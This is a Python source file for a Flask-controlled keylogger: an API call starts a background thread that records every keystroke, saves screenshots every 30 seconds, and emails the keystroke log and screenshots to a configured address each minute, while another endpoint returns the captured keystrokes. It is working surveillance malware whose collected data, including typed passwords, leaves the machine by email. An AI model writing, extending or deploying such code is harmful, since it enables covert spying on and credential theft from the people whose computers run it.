import threading
import time
import os
import pyautogui
import smtplib
import psycopg2
import pynput
from pynput.keyboard import Listener
from dotenv import load_dotenv
from flask import Flask, jsonify
from flask_cors import CORS
from email.message import EmailMessage
import mimetypes
from flask import Flask, request, jsonify
# from clerk_backend_api import Clerk
import requests
import jwt
from flask import Flask, request, jsonify

CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
CLERK_API_URL = "https://api.clerk.dev/v1"


load_dotenv()

app = Flask(__name__)
CORS(app)

# Database Connection
def get_db_connection():
    return psycopg2.connect(
        dbname=os.getenv("DB_NAME"),
        user=os.getenv("DB_USER"),
        password=os.getenv("DB_PASS"),
        host=os.getenv("DB_HOST"),
        port=os.getenv("DB_PORT")
    )

# Email Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
EMAIL_SENDER = os.getenv("SENDER_EMAIL")
EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")

# Monitoring Variables
monitoring = False
monitoring_thread = None
keystroke_data = []
keylog_listener = None

# File Paths
LOG_FOLDER = "./logs"
LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
REPORT_INTERVAL = 60
SCREENSHOT_INTERVAL = 30


### **📂 Ensure Required Folders and Files Exist**
def ensure_directories():
    if not os.path.exists(LOG_FOLDER):
        os.makedirs(LOG_FOLDER)
    if not os.path.exists(SCREENSHOT_FOLDER):
        os.makedirs(SCREENSHOT_FOLDER)
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()  # Create an empty log file if not exists


### **📸 Screenshot Capture**
def capture_screenshot():
    screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path


### **⌨ Keylogger Function**
def on_press(key):
    try:
        key_text = key.char if hasattr(key, 'char') else str(key)
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key_text}\n"

        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_entry)

    except Exception as e:
        print(f"❌ Keylogger Error: {e}")


### **📩 Email Report Function**
def send_email_report():
    try:
        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg.set_content("Attached are the latest keystroke logs and screenshots.")

        # Attach keylogs
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")

        # Attach screenshots
        if os.path.exists(SCREENSHOT_FOLDER):
            for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
                if filename.endswith(".png"):
                    ctype, _ = mimetypes.guess_type(filepath)
                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
                    with open(filepath, "rb") as f:
                        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)

        # Send Email
        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✅ Email Sent Successfully with Multiple Screenshots!")

    except Exception as e:
        print(f"❌ Email Error: {e}")


### **🖥 Background Monitoring Task**
def monitor_activity():
    global monitoring, keylog_listener
    last_screenshot_time = time.time()
    last_email_time = time.time()

    # Start Keylogger Listener
    with pynput.keyboard.Listener(on_press=on_press) as keylog_listener:
        while monitoring:
            time.sleep(5)

            # Take Screenshots at set intervals
            if time.time() - last_screenshot_time >= SCREENSHOT_INTERVAL:
                capture_screenshot()
                last_screenshot_time = time.time()

            # Send Email Reports at set intervals
            if time.time() - last_email_time >= REPORT_INTERVAL:
                send_email_report()
                last_email_time = time.time()

def verify_clerk_token(token):
    try:
        # Decode the JWT token using Clerk's public key
        decoded_token = jwt.decode(token, CLERK_JWT_PUBLIC_KEY, algorithms=["RS256"])
        return decoded_token
    except jwt.ExpiredSignatureError:
        return None
    except jwt.InvalidTokenError:
        return None
    
@app.route("/protected", methods=["GET"])
def protected_route():
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return jsonify({"error": "Unauthorized"}), 401

    token = auth_header.split(" ")[1]
    user_data = verify_clerk_token(token)

    if not user_data:
        return jsonify({"error": "Invalid Token"}), 401

    return jsonify({"message": "Authenticated", "user": user_data})


### **🟢 Start Monitoring API**
@app.route('/start_monitoring', methods=['POST'])
def start_monitoring():
    global monitoring, monitoring_thread

    if monitoring:
        return jsonify({'message': 'Monitoring already running'}), 400

    ensure_directories()  # Ensure folders and files exist before starting
    monitoring = True
    monitoring_thread = threading.Thread(target=monitor_activity, daemon=True)
    monitoring_thread.start()

    return jsonify({'message': 'Monitoring started'}), 200


@app.route('/get_logs', methods=['GET'])
def get_logs():
    try:
        # Read keystrokes logs
        keystrokes = []
        keystrokes_file = os.path.join(LOG_FOLDER, "keylogs.txt")
        if os.path.exists(keystrokes_file):
            with open(keystrokes_file, "r") as file:
                keystrokes = file.readlines()

        # Get list of screenshots
        screenshots = []
        if os.path.exists(SCREENSHOT_FOLDER):
            screenshots = os.listdir(SCREENSHOT_FOLDER)

        return jsonify({"keystrokes": keystrokes, "screenshots": screenshots})

    except Exception as e:
        return jsonify({"error": str(e)}), 500


### **🔴 Stop Monitoring API**
@app.route('/stop_monitoring', methods=['POST'])
def stop_monitoring():
    global monitoring

    if not monitoring:
        return jsonify({'message': 'Monitoring is not running'}), 400

    monitoring = False
    return jsonify({'message': 'Monitoring stopped'}), 200


if __name__ == "__main__":
    ensure_directories()  # Ensure everything is set up before running
    app.run(debug=True)
